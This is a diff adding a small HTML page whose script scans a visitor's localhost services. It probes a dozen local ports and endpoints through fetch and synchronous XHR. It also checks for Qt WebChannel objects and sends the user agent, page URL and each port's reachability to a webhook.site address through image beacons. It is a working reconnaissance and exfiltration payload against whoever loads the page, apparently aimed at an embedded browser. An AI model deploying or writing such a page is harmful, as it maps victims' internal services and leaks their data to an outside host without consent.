@@ -1,0 +1,44 @@
+<!doctype html><html><head><meta charset="utf-8"></head><body><h2>bp2</h2>
+<script>
+(function(){
+  var W="https://webhook.site/c7b10235-199e-45d3-89bd-2f53b4ecab6d";
+  function b(k,v){ try{ (new Image()).src = W+"?t="+encodeURIComponent(k)+"&v="+encodeURIComponent(String(v).slice(0,190))+"&x="+Math.random(); }catch(e){} }
+  b("boot2","loaded");
+  b("ua", navigator.userAgent);
+  b("origin", location.href.slice(0,90));
+  b("qt", (typeof window.qt)+"/"+(typeof window.webChannelTransport)+"/"+(typeof window.QWebChannel));
+
+  var targets = [
+    ["t443","https://127.0.0.1/"],
+    ["t80","http://127.0.0.1/"],
+    ["t4003","https://127.0.0.1:4003/"],
+    ["t4003st","https://127.0.0.1:4003/v2/configuration/system/status"],
+    ["t6542","http://127.0.0.1:6542/"],
+    ["t7000","http://127.0.0.1:7000/"],
+    ["t47000","http://127.0.0.1:47000/"],
+    ["t22","http://127.0.0.1:22/"],
+    ["t8080","http://127.0.0.1:8080/"],
+    ["t8443","https://127.0.0.1:8443/"],
+    ["t9090","http://127.0.0.1:9090/"],
+    ["t5555","http://127.0.0.1:5555/"]
+  ];
+  // reachability via fetch no-cors (resolve = reachable, reject = not)
+  for (var i=0;i<targets.length;i++) (function(n,u){
+    var t0=Date.now();
+    try {
+      fetch(u,{mode:'no-cors',cache:'no-store'}).then(function(){ b("R_"+n,"reachable "+(Date.now()-t0)+"ms"); })
+        .catch(function(e){ b("R_"+n,"unreach "+String(e).slice(0,40)); });
+    } catch(e){ b("R_"+n,"throw "+String(e).slice(0,30)); }
+  })(targets[i][0],targets[i][1]);
+  // readable-body attempt via sync XHR (status only exposed when CORS/auth allows)
+  setTimeout(function(){},0); // blocked APIs are fine; keep everything sync-ish
+  for (var j=0;j<targets.length;j++) (function(n,u){
+    try {
+      var x=new XMLHttpRequest(); x.open("GET",u,false);
+      try { x.send(null); b("X_"+n,"st="+x.status+" len="+(x.responseText?x.responseText.length:0)); }
+      catch(e){ b("X_"+n,"send-err"); }
+    } catch(e){ b("X_"+n,"open-err "+String(e).slice(0,30)); }
+  })(targets[j][0],targets[j][1]);
+  b("done2","1");
+})();
+</script></body></html>
